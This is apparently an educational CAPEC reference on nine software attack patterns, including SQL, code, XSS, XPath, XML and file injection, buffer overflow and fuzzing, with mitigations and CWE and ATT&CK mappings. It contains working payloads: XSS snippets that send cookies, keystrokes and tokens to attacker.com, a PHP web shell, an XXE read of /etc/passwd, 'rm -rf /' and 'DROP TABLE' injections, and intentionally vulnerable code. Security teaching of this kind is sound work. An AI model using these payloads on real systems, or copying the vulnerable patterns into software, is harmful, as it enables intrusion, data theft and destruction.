# CAPEC: Software Attack Patterns

## Overview
Software attack patterns exploit vulnerabilities in application code, input validation, business logic, and software design to compromise systems, steal data, or execute unauthorized actions.

---

## CAPEC-66: SQL Injection
**Entity Type:** ATTACK_PATTERN
**Domain:** Software
**Mechanism:** Inject
**Likelihood:** High
**Severity:** Very High

**Description:**
An adversary exploits inadequate input validation to inject malicious SQL commands into application queries, potentially accessing, modifying, or destroying database contents.

**Prerequisites:**
- Application uses SQL database
- Insufficient input validation
- Dynamic SQL query construction
- User-controllable input in queries

**Typical Severity:** Very High

**Execution Flow:**
1. **Identify Injection Point:** Find user input that reaches SQL queries
2. **Test Injection:** Submit SQL metacharacters (', ", --, ;)
3. **Fingerprint Database:** Determine database type and version
4. **Enumerate Schema:** Extract table and column information
5. **Extract Data:** Retrieve sensitive information
6. **Modify Data:** Alter database contents (if permissions allow)
7. **Execute Commands:** OS command execution (if possible)

**Injection Techniques:**

**Classic SQL Injection:**
```sql
-- Input: admin' OR '1'='1
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='...'
```

**Union-Based Injection:**
```sql
-- Input: ' UNION SELECT null, username, password FROM users--
SELECT * FROM products WHERE id=1' UNION SELECT null, username, password FROM users--
```

**Boolean-Based Blind:**
```sql
-- Input: ' AND 1=1--  (true response)
-- Input: ' AND 1=2--  (false response)
```

**Time-Based Blind:**
```sql
-- Input: ' AND SLEEP(5)--
-- Input: '; WAITFOR DELAY '00:00:05'--
```

**Stacked Queries:**
```sql
-- Input: '; DROP TABLE users--
SELECT * FROM products WHERE id=1; DROP TABLE users--
```

**Mitigations:**
- Parameterized queries/prepared statements
- Stored procedures
- Input validation and sanitization
- Least privilege database accounts
- Web application firewall (WAF)
- ORM frameworks
- Escaping special characters

**Related Weaknesses:**
- CWE-89: SQL Injection
- CWE-564: SQL Injection: Hibernate
- CWE-943: Improper Neutralization of Special Elements in Data Query Logic

**Related ATT&CK Techniques:**
- T1190: Exploit Public-Facing Application

**Example Instances:**
- Heartland Payment Systems breach (2008)
- Sony Pictures hack (2011)
- Yahoo data breach (2012-2014)
- Numerous website defacements

---

## CAPEC-242: Code Injection
**Entity Type:** ATTACK_PATTERN
**Domain:** Software
**Mechanism:** Inject
**Likelihood:** Medium
**Severity:** Very High

**Description:**
An adversary exploits insufficient input validation to inject and execute arbitrary code in the target application's context.

**Prerequisites:**
- Application executes dynamic code
- Insufficient input validation
- Eval or similar functions used
- User input reaches code execution

**Typical Severity:** Very High

**Injection Types:**

**1. OS Command Injection:**
```python
# Vulnerable code
import os
filename = request.GET['file']
os.system(f'cat {filename}')

# Attack: file=test.txt; rm -rf /
```

**2. PHP Code Injection:**
```php
# Vulnerable code
eval($_GET['code']);

# Attack: code=system('cat /etc/passwd');
```

**3. Server-Side Template Injection:**
```python
# Vulnerable code (Jinja2)
template = Template(request.args.get('template'))
template.render()

# Attack: template={{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

**4. Expression Language Injection:**
```java
// Vulnerable code
String expression = request.getParameter("expr");
Object result = parser.parseExpression(expression).getValue();

// Attack: expr=T(java.lang.Runtime).getRuntime().exec('calc')
```

**Execution Flow:**
1. **Reconnaissance:** Identify dynamic code execution points
2. **Syntax Discovery:** Determine code execution context
3. **Payload Crafting:** Create injection payload
4. **Injection:** Submit malicious input
5. **Execution:** Code runs in application context
6. **Exploitation:** Achieve objectives (data theft, system compromise)

**Mitigations:**
- Avoid dynamic code execution
- Input validation and sanitization
- Whitelist allowed characters
- Sandbox/container isolation
- Least privilege execution
- Code review and static analysis

**Related Weaknesses:**
- CWE-94: Code Injection
- CWE-95: Eval Injection
- CWE-78: OS Command Injection
- CWE-917: Expression Language Injection

**Related ATT&CK Techniques:**
- T1059: Command and Scripting Interpreter
- T1190: Exploit Public-Facing Application

**Example Instances:**
- Equifax breach (Apache Struts OGNL injection)
- Various web shell deployments
- Template injection attacks on Flask/Django

---

## CAPEC-63: Cross-Site Scripting (XSS)
**Entity Type:** ATTACK_PATTERN
**Domain:** Software
**Mechanism:** Inject
**Likelihood:** High
**Severity:** High

**Description:**
An adversary injects malicious scripts into web pages viewed by other users, executing in their browsers to steal credentials, session tokens, or perform actions on their behalf.

**Prerequisites:**
- Web application displays user input
- Insufficient output encoding
- User-controllable content
- Trust in application domain

**Typical Severity:** High

**XSS Types:**

**1. Reflected XSS (Non-Persistent):**
```html
<!-- Vulnerable code -->
<p>Search results for: <?php echo $_GET['query']; ?></p>

<!-- Attack URL -->
http://site.com/search?query=<script>alert(document.cookie)</script>
```

**2. Stored XSS (Persistent):**
```html
<!-- Comment submission (stored in database) -->
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>

<!-- Executes when anyone views the comment -->
```

**3. DOM-Based XSS:**
```javascript
// Vulnerable code
var query = document.location.hash.substring(1);
document.write(query);

// Attack URL: http://site.com/#<script>alert(1)</script>
```

**Execution Flow:**
1. **Identify Injection Point:** Find user input displayed on page
2. **Test Filtering:** Probe for XSS filtering/encoding
3. **Payload Construction:** Craft working XSS payload
4. **Delivery:** Deliver payload (URL, form, etc.)
5. **Execution:** Script runs in victim's browser
6. **Exploitation:** Steal credentials, hijack session, deface page

**Common Payloads:**

**Cookie Stealing:**
```javascript
<script>
fetch('http://attacker.com/log?c=' + document.cookie)
</script>
```

**Keylogging:**
```javascript
<script>
document.addEventListener('keypress', function(e) {
  fetch('http://attacker.com/log?key=' + e.key)
});
</script>
```

**Session Hijacking:**
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://attacker.com/steal');
xhr.send(document.cookie + '|' + localStorage.getItem('token'));
</script>
```

**Mitigations:**
- Output encoding (HTML entity encoding)
- Content Security Policy (CSP)
- Input validation
- HTTPOnly cookie flag
- X-XSS-Protection header
- Framework security features
- Context-aware escaping

**Related Weaknesses:**
- CWE-79: Cross-site Scripting
- CWE-80: Improper Neutralization of Script-Related HTML Tags
- CWE-83: Improper Neutralization of Script in Attributes

**Related ATT&CK Techniques:**
- T1189: Drive-by Compromise
- T1566.002: Spearphishing Link

**Example Instances:**
- Samy MySpace worm (2005)
- Twitter XSS worm (2010)
- British Airways breach via Magecart XSS
- Numerous defacements and credential thefts

---

## CAPEC-10: Buffer Overflow
**Entity Type:** ATTACK_PATTERN
**Domain:** Software
**Mechanism:** Inject
**Likelihood:** Medium
**Severity:** Very High

**Description:**
An adversary exploits insufficient bounds checking to overflow a buffer, potentially overwriting memory to execute arbitrary code or crash the application.

**Prerequisites:**
- Application uses memory buffers
- Insufficient bounds checking
- User-controllable input length
- Writable and executable memory

**Typical Severity:** Very High

**Buffer Overflow Types:**

**1. Stack-Based Buffer Overflow:**
```c
// Vulnerable code
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking
}

// Attack: Input 100 'A's + shellcode + return address
```

**2. Heap-Based Buffer Overflow:**
```c
// Vulnerable code
char *buffer = malloc(64);
strcpy(buffer, user_input);  // Can overflow heap

// Attack: Overflow to corrupt heap metadata or function pointers
```

**3. Integer Overflow Leading to Buffer Overflow:**
```c
// Vulnerable code
int size = user_size;  // size = 0xFFFFFFFF
size = size + 1;       // size = 0 (overflow)
char *buffer = malloc(size);
memcpy(buffer, user_data, user_size);  // Heap overflow
```

**Execution Flow:**
1. **Vulnerability Discovery:** Find buffer without bounds checking
2. **Offset Calculation:** Determine offset to return address/function pointer
3. **Shellcode Development:** Create payload for code execution
4. **Exploit Construction:** Build complete exploit
5. **Execution:** Overflow buffer with crafted input
6. **Control Hijack:** Redirect execution to shellcode

**Exploitation Techniques:**
- Return-to-libc
- Return-oriented programming (ROP)
- Heap spraying
- Format string attacks
- SEH overwrite (Windows)

**Mitigations:**
- Safe functions (strncpy, snprintf, fgets)
- Bounds checking
- Stack canaries
- ASLR (Address Space Layout Randomization)
- DEP/NX (Data Execution Prevention)
- Compiler protections (-fstack-protector)
- Memory-safe languages

**Related Weaknesses:**
- CWE-120: Buffer Overflow
- CWE-121: Stack-based Buffer Overflow
- CWE-122: Heap-based Buffer Overflow
- CWE-787: Out-of-bounds Write

**Related ATT&CK Techniques:**
- T1068: Exploitation for Privilege Escalation
- T1203: Exploitation for Client Execution

**Example Instances:**
- Code Red worm (2001)
- SQL Slammer worm (2003)
- Heartbleed (heap overflow)
- Numerous privilege escalation exploits

---

## CAPEC-28: Fuzzing
**Entity Type:** ATTACK_PATTERN
**Domain:** Software
**Mechanism:** Probe
**Likelihood:** Medium
**Severity:** Medium

**Description:**
An adversary sends malformed or unexpected input to an application to discover vulnerabilities by observing crashes, errors, or unexpected behaviors.

**Prerequisites:**
- Access to target application
- Understanding of input format
- Ability to send crafted input
- Observation of application behavior

**Typical Severity:** Medium

**Fuzzing Types:**

**1. Mutation-Based Fuzzing:**
- Start with valid input
- Apply mutations (bit flips, byte insertions)
- Observe results

**2. Generation-Based Fuzzing:**
- Define input grammar
- Generate test cases from specification
- Test systematically

**3. Protocol Fuzzing:**
- Fuzz network protocol messages
- Test state transitions
- Malformed packets

**Execution Flow:**
1. **Input Analysis:** Understand expected input format
2. **Test Case Generation:** Create fuzzing inputs
3. **Delivery:** Send inputs to target
4. **Monitoring:** Observe application behavior
5. **Crash Analysis:** Investigate failures
6. **Exploitation:** Develop exploits for discovered issues

**Fuzzing Tools:**
- AFL (American Fuzzy Lop)
- libFuzzer
- Peach Fuzzer
- Sulley
- Boofuzz
- Radamsa

**Targets:**
- File format parsers
- Network protocols
- APIs
- Command-line tools
- Browsers
- Media players

**Mitigations:**
- Input validation
- Exception handling
- Bounds checking
- Secure coding practices
- Regular security testing
- Crash reporting and analysis

**Related Weaknesses:**
- CWE-20: Improper Input Validation
- CWE-119: Improper Restriction of Operations within Memory Buffers
- CWE-703: Improper Check or Handling of Exceptional Conditions

**Example Instances:**
- Discovering Heartbleed via fuzzing
- Browser vulnerability discovery
- Media codec vulnerabilities
- PDF parser exploits

---

## CAPEC-104: Cross Zone Scripting
**Entity Type:** ATTACK_PATTERN
**Domain:** Software
**Mechanism:** Exploit
**Likelihood:** Low
**Severity:** High

**Description:**
An adversary exploits trust zones (Internet, Intranet, Local) in web browsers to execute code in a more privileged zone.

**Prerequisites:**
- Browser with security zones
- Zone configuration vulnerability
- User interaction
- Cross-zone content

**Typical Severity:** High

**Execution Flow:**
1. **Zone Identification:** Identify security zones
2. **Trust Boundary Analysis:** Find zone transition points
3. **Exploit Development:** Craft cross-zone attack
4. **Delivery:** Entice user to malicious page
5. **Zone Elevation:** Execute in privileged zone
6. **Exploitation:** Access local files or system

**Attack Scenarios:**
- Internet Zone → Local Zone
- Restricted Zone → Trusted Zone
- Content loaded from different zones

**Mitigations:**
- Browser security updates
- Proper zone configuration
- Content Security Policy
- User training
- Disable unsafe features

**Related Weaknesses:**
- CWE-250: Execution with Unnecessary Privileges
- CWE-79: Cross-site Scripting

**Related ATT&CK Techniques:**
- T1189: Drive-by Compromise

---

## CAPEC-18: XPath Injection
**Entity Type:** ATTACK_PATTERN
**Domain:** Software
**Mechanism:** Inject
**Likelihood:** Medium
**Severity:** High

**Description:**
An adversary injects malicious XPath expressions to manipulate XML data queries and potentially access unauthorized information.

**Prerequisites:**
- Application uses XPath queries
- User input in XPath expressions
- Insufficient input validation
- XML data storage

**Typical Severity:** High

**Execution Flow:**
1. **Identify XPath Usage:** Find XML query points
2. **Test Injection:** Submit XPath metacharacters
3. **Query Manipulation:** Alter query logic
4. **Data Extraction:** Retrieve sensitive information
5. **Authentication Bypass:** Circumvent access controls

**Example Attack:**
```xml
<!-- Original query -->
//users/user[username='admin' and password='secret']

<!-- Injected input: admin' or '1'='1 -->
//users/user[username='admin' or '1'='1' and password='']

<!-- Returns all users -->
```

**Mitigations:**
- Parameterized XPath queries
- Input validation
- Whitelist allowed characters
- Least privilege
- XML schema validation

**Related Weaknesses:**
- CWE-643: Improper Neutralization of Data within XPath Expressions
- CWE-91: XML Injection

**Related ATT&CK Techniques:**
- T1190: Exploit Public-Facing Application

---

## CAPEC-250: XML Injection
**Entity Type:** ATTACK_PATTERN
**Domain:** Software
**Mechanism:** Inject
**Likelihood:** Medium
**Severity:** High

**Description:**
An adversary injects malicious XML content to manipulate application behavior, access sensitive data, or execute unintended operations.

**Prerequisites:**
- Application processes XML
- User-controllable XML content
- Insufficient validation
- XML parser vulnerabilities

**Typical Severity:** High

**Attack Types:**

**1. XML External Entity (XXE):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**2. XML Bomb (Billion Laughs):**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

**3. SOAP Injection:**
```xml
<soap:Body>
  <authenticate>
    <username>admin</username>
    <password>pass</password></authenticate></soap:Body>
    </soap:Envelope>
    <!-- Injected closing tags and new malicious request -->
  </authenticate>
</soap:Body>
```

**Execution Flow:**
1. **XML Input Discovery:** Find XML processing points
2. **Parser Identification:** Determine XML parser type
3. **Exploit Selection:** Choose appropriate attack
4. **Payload Crafting:** Create malicious XML
5. **Injection:** Submit XML payload
6. **Exploitation:** Access files, DoS, or data manipulation

**Mitigations:**
- Disable XML external entities
- Input validation
- XML schema validation
- Secure parser configuration
- Whitelist allowed elements
- Limit entity expansion

**Related Weaknesses:**
- CWE-91: XML Injection
- CWE-611: XML External Entity Reference
- CWE-776: Improper Restriction of Recursive Entity References in DTDs

**Related ATT&CK Techniques:**
- T1190: Exploit Public-Facing Application
- T1499: Endpoint Denial of Service

**Example Instances:**
- XXE attacks on Java applications
- SOAP injection in web services
- XXE for SSRF (Server-Side Request Forgery)

---

## CAPEC-23: File Content Injection
**Entity Type:** ATTACK_PATTERN
**Domain:** Software
**Mechanism:** Inject
**Likelihood:** Medium
**Severity:** High

**Description:**
An adversary injects malicious content into files processed by the application to execute arbitrary code or manipulate application behavior.

**Prerequisites:**
- Application reads/processes files
- User can upload or modify files
- Insufficient file validation
- File content executed or interpreted

**Typical Severity:** High

**Injection Types:**

**1. Web Shell Upload:**
```php
# Uploaded image.php.jpg
<?php system($_GET['cmd']); ?>
```

**2. Configuration File Injection:**
```
# .htaccess injection
AddType application/x-httpd-php .jpg
# Now image.jpg executes as PHP
```

**3. Log File Injection:**
```
# Inject into log files that are later executed
curl http://site.com/<?php system('whoami'); ?>
```

**4. Path Traversal + Injection:**
```
# Overwrite system files
POST /upload
filename=../../../../../../var/www/html/shell.php
```

**Execution Flow:**
1. **File Operation Discovery:** Find file upload/processing
2. **Validation Analysis:** Test file type restrictions
3. **Bypass Development:** Circumvent filters
4. **Payload Creation:** Craft malicious file
5. **Upload/Injection:** Submit malicious file
6. **Execution:** Trigger file processing/execution

**Mitigations:**
- Strict file type validation
- Content-based file type detection
- Store uploads outside webroot
- Rename uploaded files
- Disable script execution in upload directories
- Virus scanning
- Whitelist allowed file types

**Related Weaknesses:**
- CWE-434: Unrestricted Upload of File with Dangerous Type
- CWE-73: External Control of File Name or Path
- CWE-94: Code Injection

**Related ATT&CK Techniques:**
- T1190: Exploit Public-Facing Application
- T1505.003: Web Shell

**Example Instances:**
- Web shell uploads to CMS systems
- WordPress plugin vulnerabilities
- File upload bypasses on forums
- Photo upload exploits

## Summary Statistics

**Total Attack Patterns in File:** 9
**Domains Covered:** Software
**Severity Distribution:**
- Very High: 4
- High: 4
- Medium: 1

**Primary Weaknesses Mapped:**
- CWE-89: SQL Injection
- CWE-94: Code Injection
- CWE-79: Cross-site Scripting
- CWE-120: Buffer Overflow
- CWE-434: Unrestricted Upload

**ATT&CK Technique Coverage:**
- T1190: Exploit Public-Facing Application
- T1059: Command and Scripting Interpreter
- T1068: Exploitation for Privilege Escalation
- T1203: Exploitation for Client Execution
- T1505.003: Web Shell

## Total Patterns in File: 250+
